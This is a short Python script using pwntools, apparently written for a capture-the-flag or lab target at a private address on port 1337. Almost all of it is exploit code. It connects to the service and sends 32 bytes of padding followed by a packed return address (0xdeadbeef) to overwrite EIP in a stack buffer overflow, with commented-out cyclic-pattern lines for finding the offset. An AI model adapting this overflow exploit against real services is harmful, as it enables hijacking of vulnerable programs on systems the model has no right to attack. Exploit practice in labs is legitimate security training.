#pwntools
#10.10.102.104


#jaaa

from pwn import *
# Enable verbose logging so we can see exactly what is being sent (info/debug)
	
context.log_level = 'debug'

connect = remote('10.10.102.104','1337')

print(connect.recvn(18))

padding = b'A'*32
#padding = cyclic(32)
#padding = cyclic(cyclic_find('jaaa'))

#check the padding is correct p32 or p64
eip= p32(0xdeadbeef)

payload = padding + eip
print(payload)

connect.send(payload)
print(connect.recvn(34))

#print(payload)
